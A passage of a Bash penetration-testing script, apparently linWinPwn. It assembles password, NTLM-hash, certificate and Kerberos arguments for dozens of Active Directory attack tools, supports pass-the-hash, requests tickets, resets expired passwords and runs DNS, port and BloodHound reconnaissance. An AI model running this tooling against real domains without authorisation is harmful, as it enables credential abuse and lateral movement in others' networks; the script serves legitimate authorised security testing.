        argument_bhd="-u '${user}'\\@${domain} -p '${password}' --auth-method ntlm"
        argument_enum4linux="-w ${domain} -u '${user}' -p '${password}'"
        argument_adidns="-u ${domain}\\\\'${user}' -p '${password}'"
        argument_ldd="-u ${domain}\\\\'${user}' -p '${password}'"
        argument_smbmap="-d ${domain} -u '${user}' -p '${password}'"
        argument_certi_py="${domain}/'${user}':'${password}'"
        argument_certipy="-u '${user}'\\@${domain} -p '${password}'"
        argument_ldeep="-d ${domain} -u '${user}' -p '${password}'"
        argument_pre2k="-d ${domain} -u '${user}' -p '${password}'"
        argument_certsync="-d ${domain} -u '${user}' -p '${password}'"
        argument_donpapi="-d ${domain} -u '${user}' -p '${password}'"
        argument_hekatomb="${domain}/'${user}':'${password}'"
        argument_silenthd="-u ${domain}\\\\'${user}' -p '${password}'"
        argument_windap="-d ${domain} -u '${user}' -p '${password}'"
        argument_targkerb="-d ${domain} -u '${user}' -p '${password}'"
        argument_p0dalirius="-d ${domain} -u '${user}' -p '${password}'"
        argument_p0dalirius_a="-ad ${domain} -au '${user}' -ap '${password}'"
        argument_manspider="-d ${domain} -u '${user}' -p '${password}'"
        argument_coercer="-d ${domain} -u '${user}' -p '${password}'"
        argument_bloodyad="-d ${domain} -u '${user}' -p '${password}'"
        argument_aced="${domain}/'${user}':'${password}'"
        argument_sccm="-d ${domain} -u '${user}' -p '${password}'"
        argument_ldapper="-D ${domain} -U '${user}' -P '${password}'"
        argument_adalanche="--authmode ntlm --username '${user}'\\@${domain} --password '${password}'"
        argument_mssqlrelay="-u '${user}'\\@${domain} -p '${password}'"
        argument_pygpoabuse="${domain}/'${user}':'${password}'"
        argument_GPOwned="-d ${domain} -u '${user}' -p '${password}'"
        argument_privexchange="-d ${domain} -u '${user}' -p '${password}'"
        argument_adcheck="-d ${domain} -u '${user}' -p '${password}'"
        argument_evilwinrm="-u '${user}' -p '${password}'"
        argument_godap="-u '${user}'@${domain} -p '${password}'"
        argument_mssqlpwner="${domain}/'${user}':'${password}'"
        argument_soapy="${domain}/'${user}':'${password}'"
        argument_secsccm="-u '${user}' -p '${password}'"
        argument_soaphd="-u '${user}' -p '${password}'"
        argument_gpopars="-d ${domain} -u '${user}' -p '${password}'"
        argument_spearspray="-d ${domain} -u '${user}' -p '${password}'"
        argument_gpb="-d ${domain} -u '${user}' -p '${password}'"
        argument_nhd="-d ${domain} -u '${user}' -p '${password}'"
        argument_daclsearch="-l ${domain} -u '${user}' -p '${password}'"
        hash_bool=false
        kerb_bool=false
        unset KRB5CCNAME
        aeskey_bool=false
        cert_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
    fi

    #Check if Certificate is provided, extract NTLM hash using PKINIT
    if [ "${cert_bool}" == true ]; then
        echo -e "${YELLOW}[!]${NC} WARNING only netexec, ldeep , Certipy and bloodyAD currently support certificate authentication.${NC}"
        echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
        if ! stat "${pfxcert}" >/dev/null 2>&1; then
            echo -e ""
            echo -e "${RED}[-]${NC} Certificate file not found!"
            exit 1
        fi
        pkinit_auth
        $(which openssl) pkcs12 -in "${pfxcert}" -out "${Credentials_dir}/${user}.pem" -nodes -passin pass:""
        if stat "${Credentials_dir}/${user}.pem" >/dev/null 2>&1; then
            pem_cert="${Credentials_dir}/${user}.pem"
            echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${Credentials_dir}/${user}.pem'"
        fi
    fi

    #Check if NTLM hash is used, and complete with empty LM hash (also uses NTLM extracted from PKINIT)
    if [ "${hash_bool}" == true ] || [ "${cert_bool}" == true ]; then
        if [[ (${#hash} -eq 65 && "${hash:32:1}" == ":") || (${#hash} -eq 33 && "${hash:0:1}" == ":") || (${#hash} -eq 32) ]]; then
            if [ "$(echo "$hash" | grep ':')" == "" ]; then
                hash=":"$hash
            fi
            if [ "$(echo "$hash" | cut -d ":" -f 1)" == "" ]; then
                hash="aad3b435b51404eeaad3b435b51404ee"$hash
            fi
            argument_ne="-d ${domain} -u '${user}' -H ${hash}"
            argument_imp=" -hashes ${hash} ${domain}/'${user}'"
            argument_imp_gp=" -hashes ${hash} ${domain}/'${user}'"
            argument_imp_ti="-user '${user}' -hashes ${hash} -domain ${domain}"
            argument_bhd="-u '${user}'\\@${domain} --hashes ${hash} --auth-method ntlm"
            argument_enum4linux="-w ${domain} -u '${user}' -H ${hash:33}"
            argument_adidns="-u ${domain}\\\\'${user}' -p ${hash}"
            argument_ldd="-u ${domain}\\\\'${user}' -p ${hash}"
            argument_smbmap="-d ${domain} -u '${user}' -p ${hash}"
            argument_certi_py="${domain}/'${user}' --hashes ${hash}"
            argument_certipy="-u '${user}'\\@${domain} -hashes ${hash}"
            argument_pre2k="-d ${domain} -u '${user}' -hashes ${hash}"
            argument_certsync="-d ${domain} -u '${user}' -hashes ${hash}"
            argument_donpapi="-H ${hash} -d ${domain} -u '${user}'"
            argument_hekatomb="-hashes ${hash} ${domain}/'${user}'"
            argument_silenthd="-u ${domain}\\\\'${user}' --hashes ${hash}"
            argument_windap="-d ${domain} -u '${user}' --hash ${hash}"
            argument_targkerb="-d ${domain} -u '${user}' -H ${hash}"
            argument_p0dalirius="-d ${domain} -u '${user}' -H ${hash:33})"
            argument_p0dalirius_a="-ad ${domain} -au '${user}' -ah ${hash}"
            argument_manspider="-d ${domain} -u '${user}' -H ${hash:33}"
            argument_coercer="-d ${domain} -u '${user}' --hashes ${hash}"
            argument_aced=" -hashes ${hash} ${domain}/'${user}'"
            argument_sccm="-d ${domain} -u '${user}' -hashes ${hash}"
            argument_ldapper="-D ${domain} -U '${user}' -P ${hash}"
            argument_ldeep="-d ${domain} -u '${user}' -H ${hash}"
            argument_bloodyad="-d ${domain} -u '${user}' -p ${hash}"
            argument_adalanche="--authmode ntlmpth --username '${user}'\\@${domain} --password ${hash}"
            argument_mssqlrelay="-u '${user}'\\@${domain} -hashes ${hash}"
            argument_pygpoabuse=" -hashes ${hash} ${domain}/'${user}'"
            argument_GPOwned="-d ${domain} -u '${user}' -hashes ${hash}"
            argument_privexchange="-d ${domain} -u '${user}' --hashes ${hash}"
            argument_adcheck="-d ${domain} -u '${user}' -H ${hash}"
            argument_evilwinrm="-u '${user}' -H ${hash:33}"
            argument_godap="-u '${user}' -d ${domain} -H ${hash}"
            argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
            argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
            argument_secsccm="-u '${user}' -H '${hash}'"
            argument_soaphd="-u '${user}' --hashes ${hash}"
            argument_gpopars="-d ${domain} -u '${user}' -H '${hash}'"
            argument_gpb="-d ${domain} -u '${user}' -H '${hash}'"
            argument_nhd="-d ${domain} -u '${user}' --hashes '${hash}'"
            argument_daclsearch="-l ${domain} -u '${user}' -H '${hash}'"
        else
            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
            exit 1
        fi
        if [ "${cert_bool}" == true ]; then
            argument_bloodyad="-d ${domain} -u '${user}' -c ':${pem_cert}'"
            argument_ldeep="-d ${domain} -u '${user}' --pfx-file '${pfxcert}'"
            argument_evilwinrm="-u '${user}' -k '${pem_cert}'"
            argument_ne="-d ${domain} -u '${user}' --pfx-cert '${pfxcert}'"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath "$pfxcert")${NC}"
        else
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
        fi
        pass_bool=false
        kerb_bool=false
        unset KRB5CCNAME
        aeskey_bool=false
    fi

    #Check if kerberos ticket is used
    if [ "${kerb_bool}" == true ]; then
        argument_ne="-d ${domain} -u '${user}' --use-kcache"
        pass_bool=false
        hash_bool=false
        aeskey_bool=false
        cert_bool=false
        forcekerb_bool=false
        if stat "${krb5cc}" >/dev/null 2>&1; then
            krb5cc_path=$(realpath "$krb5cc")
            export KRB5CCNAME=$krb5cc_path
            argument_imp="-k -no-pass ${domain}/'${user}'"
            argument_enum4linux="-w ${domain} -u '${user}' -K ${krb5cc}"
            argument_bhd="-u '${user}'\\@${domain} -k -no-pass -p '' --auth-method kerberos"
            argument_certi_py="${domain}/'${user}' -k --no-pass"
            argument_certipy="-u '${user}'\\@${domain} -k -no-pass -target ${dc_FQDN}"
            argument_ldeep="-d ${domain} -u '${user}' -k"
            argument_pre2k="-d ${domain} -u '${user}' -k -no-pass"
            argument_certsync="-d ${domain} -u '${user}' -use-kcache -no-pass -k"
            argument_donpapi="-k --no-pass -d ${domain} -u '${user}'"
            argument_targkerb="-d ${domain} -u '${user}' -k --no-pass"
            argument_p0dalirius="-d ${domain} -u '${user}' -k --no-pass"
            argument_p0dalirius_a="-ad ${domain} -au '${user}' -k --no-pass"
            argument_bloodyad="-d ${domain} -u '${user}' -k"
            argument_adalanche="--authmode kerberoscache --username '${user}'\\@${domain}"
            argument_aced="-k -no-pass ${domain}/'${user}'"
            argument_sccm="-d ${domain} -u '${user}' -k -no-pass"
            argument_mssqlrelay="-u '${user}'\\@${domain} -k -no-pass -target ${target}"
            argument_pygpoabuse="${domain}/'${user}' -k -ccache $(realpath "$krb5cc")"
            argument_GPOwned="-d ${domain} -u '${user}' -k -no-pass"
            argument_evilwinrm="-r ${domain} -u '${user}'"
            argument_godap="-d ${domain} -k -t ldap/${target}"
            argument_mssqlpwner=" -k -no-pass ${domain}/'${user}'"
            argument_gpopars="-d ${domain} -u '${user}' -k"
            argument_gpb="-d ${dc_domain} -u '${user}' -k"
            argument_nhd="-d ${dc_domain} -u '${user}' -k"
            argument_daclsearch="-l ${domain} -u '${user}' -k"
            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath "$krb5cc")${NC}"
        else
            echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath "$krb5cc")..."
            exit 1
        fi
    fi

    #Check if kerberos AES key is used
    if [ "${aeskey_bool}" == true ]; then
        argument_ne="-d ${domain} -u '${user}' --aesKey ${aeskey}"
        argument_imp="-aesKey ${aeskey} ${domain}/'${user}'"
        argument_bhd="-u '${user}'\\@${domain} -aesKey ${aeskey} --auth-method kerberos"
        argument_certi_py="${domain}/'${user}' --aes ${aeskey} -k"
        argument_certipy="-u '${user}'\\@${domain} -aes ${aeskey} -target ${dc_FQDN}"
        argument_pre2k="-d ${domain} -u '${user}' -aes ${aeskey} -k"
        argument_certsync="-d ${domain} -u '${user}' -aesKey ${aeskey} -k"
        argument_donpapi="-k --aesKey ${aeskey} -d ${domain} -u '${user}'"
        argument_targkerb="-d ${domain} -u '${user}' --aes-key ${aeskey} -k"
        argument_p0dalirius="-d ${domain} -u '${user}' --aes-key ${aeskey} -k"
        argument_p0dalirius_a="-ad ${domain} -au '${user}' --aes-key ${aeskey} -k"
        argument_aced="-aes ${aeskey} ${domain}/'${user}'"
        argument_sccm="-d ${domain} -u '${user}' -aes ${aeskey}"
        argument_mssqlrelay="-u '${user}'\\@${domain} -aes ${aeskey} -k"
        argument_GPOwned="-d ${domain} -u '${user}' -aesKey ${aeskey} -k"
        argument_mssqlpwner="${domain}/'${user}' -aesKey ${aeskey} -k"
        argument_daclsearch="-l ${domain} -u '${user}' --aeskey ${aeskey} -k"
        pass_bool=false
        hash_bool=false
        kerb_bool=false
        unset KRB5CCNAME
        cert_bool=false
        forcekerb_bool=false
        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
    fi

    if [ "${forcekerb_bool}" == true ]; then
        argument_ne="${argument_ne} -k"
    fi

    #Perform authentication using provided credentials
    if [ "${nullsess_bool}" == false ]; then
        run_command "${netexec} smb ${target} ${argument_ne}" 2>&1 > "${output_dir}/netexec_authcheck_${user_var}.txt"
        auth_check=$(/bin/cat "${output_dir}/netexec_authcheck_${user_var}.txt" | grep -v " Error checking if user is admin on "|  grep "\[-\]\|Traceback" -A 10 2>&1)
        if [ -n "$auth_check" ]; then
            echo "$auth_check"
            if [[ $auth_check == *"STATUS_NOT_SUPPORTED"* ]]; then
                echo -e "${BLUE}[*] Domain does not support NTLM authentication. Attempting to generate TGT ticket to use Kerberos instead..${NC}"
                if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                    echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
                    krb_ticket="${Credentials_dir}/${user}"
                    run_command "${netexec} ${ne_verbose} smb ${dc_FQDN} ${argument_ne} -k --kdcHost ${dc_FQDN} --generate-tgt ${krb_ticket} --log ${Credentials_dir}/getTGT_output_${user_var}.txt"
                    if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                        echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
                        echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
                        exit 1
                    else
                        echo -e "${RED}[-] Failed to generate TGT${NC}"
                    fi
                else
                    echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
                fi
            fi
            if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]] || [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                if ! stat "${impacket_changepasswd}" >/dev/null 2>&1; then
                    echo -e "${RED}[-] changepasswd.py not found! Please verify the installation of impacket${NC}"
                elif [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                    echo -e "${PURPLE}[-] changepasswd does not support Kerberos authentication${NC}"
                else
                    pass_passchange=""
                    if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]]; then
                        echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password (default: Summer3000_):${NC}"
                        read -rp ">> " pass_passchange </dev/tty
                        if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
                        echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a "${Modification_dir}/impacket_changepasswd_${user_var}.txt"
                    elif [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                        echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password (default: Summer3000_):${NC}"
                        read -rp ">> " pass_passchange </dev/tty
                        if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
                        authuser_passchange=""
                        echo -e "${BLUE}[*] Please specify username for RPC authentication:${NC}"
                        echo -e "${CYAN}[*] Example: user01 ${NC}"
                        read -rp ">> " authuser_passchange </dev/tty
                        while [ "${pass_passchange}" == "" ]; do
                            echo -e "${RED}Invalid username.${NC} Please specify username:"
                            read -rp ">> " authuser_passchange </dev/tty
                        done
                        authpass_passchange=""
                        echo -e "${BLUE}[*] Please specify password for RPC authentication:${NC}"
                        read -rp ">> " authpass_passchange </dev/tty
                        while [ "${pass_passchange}" == "" ]; do
                            echo -e "${RED}Invalid password.${NC} Please specify password:"
                            read -rp ">> " authpass_passchange </dev/tty
                        done
                        echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
                        run_command "${impacket_changepasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange} -altuser ${authuser_passchange} -altpass ${authpass_passchange}" | tee -a "${Modification_dir}/impacket_changepasswd_${user_var}.txt"
                    fi
                    password="${pass_passchange}"
                    auth_check=""
                    authenticate
                fi
                echo -e ""
            fi
            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
            exit 1
        fi
    fi

    if [ "${verbose_bool}" == true ]; then
        ne_verbose="--verbose"
        argument_imp="-debug ${argument_imp}"
        argument_imp_gp="-debug ${argument_imp_gp}"
        argument_imp_ti="-debug ${argument_imp_ti}"
        argument_enum4linux="${argument_enum4linux} -v"
        argument_bhd="${argument_bhd} -v"
        argument_adidns="${argument_adidns} -v -d"
        argument_pre2k="${argument_pre2k} -verbose"
        argument_certsync="${argument_certsync} -debug"
        argument_hekatomb="-debug ${argument_hekatomb}"
        argument_windap="${argument_windap} -v --debug"
        argument_targkerb="${argument_targkerb} -v"
        argument_kerbrute="-v"
        argument_manspider="${argument_manspider} -v"
        argument_coercer="${argument_coercer} -v"
        argument_CVE202233679="-debug"
        argument_bloodyad="-v DEBUG ${argument_bloodyad}"
        argument_aced="-debug ${argument_aced}"
        argument_sccm="-debug ${argument_sccm}"
        mssqlrelay_verbose="-debug"
        adalanche_verbose="--loglevel Debug"
        argument_pygpoabuse="${argument_pygpoabuse} -vv"
        argument_privexchange="${argument_privexchange} --debug"
        argument_adcheck="${argument_adcheck} --debug"
        argument_mssqlpwner="-debug ${argument_mssqlpwner}"
        argument_soapy="--debug ${argument_soapy}"
        argument_soaphd="${argument_soaphd} -v"
        argument_spearspray="${argument_spearspray} --debug"
        argument_gpb="${argument_gpb} -v"
    fi

    echo -e "${auth_string}"
    echo -e ""
}

parse_servers() {
    sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/servers_list_*_*".txt" 2>/dev/null | sort -uf >"${servers_hostname_list}" 2>&1
    sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/dc_list_*_*".txt" 2>/dev/null  | sort -uf >"${dc_hostname_list}" 2>&1
    sort -uf <(sort -uf "${Servers_dir}"/servers_ip_list_*_*".txt" 2>/dev/null) >"${servers_ip_list}"
    sort -uf <(sort -uf "${Servers_dir}"/dc_ip_list_*_*".txt" 2>/dev/null) >"${dc_ip_list}"

    if ! grep -q "${dc_ip}" "${servers_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${servers_ip_list}"; fi
    if ! grep -q "${dc_ip}" "${dc_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${dc_ip_list}"; fi
    if ! grep -q "${dc_FQDN^^}" "${dc_hostname_list}" 2>/dev/null; then echo "${dc_FQDN,,}" >>"${dc_hostname_list}"; fi
    if ! grep -q "${dc_FQDN^^}" "${servers_hostname_list}" 2>/dev/null; then echo "${dc_FQDN,,}" >>"${servers_hostname_list}"; fi
}

parse_users() {
    sort -uf <(sort -uf "${Users_dir}"/users_list_*_"${dc_domain}.txt" 2>/dev/null) >"${users_list}"

    if [[ ! "${user}" == "" ]] && ! grep -q "${user}" "${users_list}" 2>/dev/null; then echo "${user}" >>"${users_list}"; fi
}

dns_enum() {
    echo -e "${BLUE}[*] DNS dump using netexec get-network${NC}"
    dns_records="${Servers_dir}/dns_records_${dc_domain}.txt"
    if ! stat "${dns_records}" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
        run_command "${netexec} ldap ${target} ${argument_ne} -M get-network -o ALL=true" 2>&1 | tee "${Servers_dir}/get_network_output_${dc_domain}.txt"
        # Find and copy the output file from netexec logs
        nxc_dns_log=$(ls -t /home/*/.nxc/logs/${dc_domain}_network_*.log 2>/dev/null | head -1)
        if [ -z "$nxc_dns_log" ]; then
            nxc_dns_log=$(ls -t /root/.nxc/logs/${dc_domain}_network_*.log 2>/dev/null | head -1)
        fi
        if [ -n "$nxc_dns_log" ] && [ -s "$nxc_dns_log" ]; then
            cp "$nxc_dns_log" "${dns_records}"
            # Extract hostnames (first column) - filter out IPv6 and non-domain entries
            awk -F'\t' '{print $1}' "${dns_records}" | grep -i "\.${dc_domain}$" | grep -v "^_\|DnsZones" | sort -uf > "${Servers_dir}/servers_list_dns_${dc_domain}.txt"
            # Extract IPs (second column) - filter IPv4 only
            awk -F'\t' '{print $2}' "${dns_records}" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -uf > "${Servers_dir}/servers_ip_list_dns_${dc_domain}.txt"
            # Extract DC entries
            grep -i "^${dc_NETBIOS}\." "${dns_records}" | awk -F'\t' '{print $1}' | sort -uf > "${Servers_dir}/dc_list_dns_${dc_domain}.txt"
            grep -i "^${dc_NETBIOS}\." "${dns_records}" | awk -F'\t' '{print $2}' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -uf > "${Servers_dir}/dc_ip_list_dns_${dc_domain}.txt"
        fi
        parse_servers
    else
        parse_servers
        echo -e "${YELLOW}[i] DNS dump found, skipping... ${NC}"
    fi
    echo -e ""
}

# ------------------------------ Tools ------------------------------
###### net_scan: Network Scan
ne_scan() {
    echo -e "${BLUE}[*] Scanning for ${1^^} ports...${NC}"
    if [ "${curr_targets}" == "Domain Controllers" ]; then
        servers_list="${Scans_dir}/servers_dc_${1}_${dc_domain}.txt"
        servers_scan_out="${Scans_dir}/ne_${1}_dc_output_${dc_domain}.txt"
    elif [ "${curr_targets}" == "All domain servers" ]; then
        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
        servers_list="${Scans_dir}/servers_alldomain_${1}_${dc_domain}.txt"
        servers_scan_out="${Scans_dir}/ne_${1}_alldomain_output_${dc_domain}.txt"
    elif [ "${curr_targets}" == "File containing list of servers: " ]; then
        echo -e "${YELLOW}[i] Scanning servers in ${custom_servers} ${NC}"
        servers_list="${Scans_dir}/servers_custom_${1}_${dc_domain}.txt"
        servers_scan_out="${Scans_dir}/ne_${1}_custom_output_${dc_domain}.txt"
        /bin/rm "${servers_scan_out}" 2>/dev/null
    elif [ "${curr_targets}" == "IP or hostname: " ]; then
        echo -e "${YELLOW}[i] Scanning server ${custom_ip}${NC}"
        servers_list="${Scans_dir}/servers_custom_${1}_${dc_domain}.txt"
        servers_scan_out="${Scans_dir}/ne_${1}_custom_output_${dc_domain}.txt"
        /bin/rm "${servers_scan_out}" 2>/dev/null
    fi
    if stat "${servers_list}" >/dev/null 2>&1 && [ "${noexec_bool}" == "false" ]; then
        echo -e "${YELLOW}[i] ${1^^} port scan results found, would you like to run the port scan again? (y/N)${NC}"
        ans="N"
        read -rp ">> " ans </dev/tty
        if [[ ! "${ans}" == "y" ]] && [[ ! "${ans}" == "Y" ]]; then
            return 1
        fi
    fi
    run_command "${netexec} ${ne_verbose} ${1} ${curr_targets_list} -k --log ${servers_scan_out}" 2>&1
    grep -a "${1^^}" "${servers_scan_out}" 2>/dev/null | grep -aoE '\b([a-zA-Z0-9-]+\.){2,}[a-zA-Z]{2,}\b|\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u > "${servers_list}"
    sort -u "${servers_list}" -o "${servers_list}" 2>/dev/null
    echo -e ""
}

nhd_scan() {
    if ! stat "${NetworkHound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of NetworkHound{NC}"
    else
        mkdir -p "${Scans_dir}/NetworkHound"
        echo -e "${BLUE}[*] NetworkHound Domain machines basic scan${NC}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] NetworkHound requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
        run_command "${python3} ${NetworkHound} --dc ${dc_FQDN} ${argument_nhd} --dns ${dns_ip} --output ${Scans_dir}/NetworkHound/DomainScan_${dc_domain}.json" | tee "${Scans_dir}/NetworkHound/DomainScan_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

nhd_shadowit() {
    if ! stat "${NetworkHound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of NetworkHound{NC}"
    else
        mkdir -p "${Scans_dir}/NetworkHound"
        echo -e "${BLUE}[*] NetworkHound Shadow IT full scan${NC}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] NetworkHound requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
        run_command "${python3} ${NetworkHound} --dc ${dc_FQDN} ${argument_nhd} --dns ${dns_ip} --shadow-it --port-scan --valid-http --valid-smb --scan-threads 50 --output ${Scans_dir}/NetworkHound/ShadowIT_${dc_domain}.json" |  tee "${Scans_dir}/NetworkHound/ShadowIT_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

###### ad_enum: AD Enumeration
bhd_enum() {
    if ! stat "${bloodhound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        mkdir -p "${DomainRecon_dir}/BloodHound_${user_var}"
        echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(find "${DomainRecon_dir}/BloodHound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] BloodHound results found, would you like to run the scan again? (y/N)${NC}"
            bdh_ans="N"
            read -rp ">> " bdh_ans </dev/tty
            if [[ ! "${bdh_ans}" == "y" ]] && [[ ! "${bdh_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/BloodHound_${user_var}" || exit
            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
            run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
            #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dns_ip} -c All --log ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

bhd_enum_dconly() {
    if ! stat "${bloodhound}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        mkdir -p "${DomainRecon_dir}/BloodHound_${user_var}"
        echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
        if [ -n "$(find "${DomainRecon_dir}/BloodHound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
            echo -e "${YELLOW}[i] BloodHound results found, would you like to run the scan again? (y/N)${NC}"
            bdh_ans="N"
            read -rp ">> " bdh_ans </dev/tty
            if [[ ! "${bdh_ans}" == "y" ]] && [[ ! "${bdh_ans}" == "Y" ]]; then
                return 1
            fi
        fi
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd "${DomainRecon_dir}/BloodHound_${user_var}" || exit
            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param="--ldap-channel-binding"; else ldapbindsign_param=""; fi
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbindsign_param}"; else ldaps_param=""; fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="--dns-tcp "; else dnstcp_param=""; fi
            run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
            cd "${current_dir}" || exit
            #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --bloodhound --dns-server ${dns_ip} -c DCOnly --log tee ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

bhdce_enum() {
    if ! stat "${bloodhoundce}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of BloodHoundCE${NC}"
    else
        mkdir -p "${DomainRecon_dir}/BloodHoundCE_${user_var}"
